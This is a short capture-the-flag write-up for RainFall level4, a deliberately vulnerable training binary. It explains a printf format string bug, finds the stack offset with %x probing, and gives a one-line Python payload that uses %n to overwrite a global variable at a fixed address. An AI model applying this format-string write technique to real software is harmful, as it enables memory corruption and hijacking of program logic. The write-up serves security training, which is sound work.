Level4
-----

level4@RainFall:~$ ls
level4

level4@RainFall:~$ ./level4
efedf
efedf

we can see that level4 conatin the file level4, and after checking it with gdb "check asm_analysis.md" we can see that the main function calls n() function and that function calls p() function

and the vulnerability is located inside tge p() function, it's the printf()
so the mistake is, instead of "printf("%s", buffer);" they are doing "printf(buffer);"

so if if (global == 0x1025544)

1_ let's find the offset
------------------------

level4@RainFall:~$ python -c 'print "aaaa" + " %x" * 15' | ./level4
aaaa b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078


from this we can assume that aaaa is located in position 12 so the offset is 12 meaning %12n

and the condition says if (*(0x8049810) == 0x1025544)
so 0x1025544 = 16930116 (decimal)
so we must make *(0x8049810) = 16930116

in printf %10d means Print a decimal number using at least 10 characters width. If the number is shorter, it pads with spaces.

python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' | ./level4
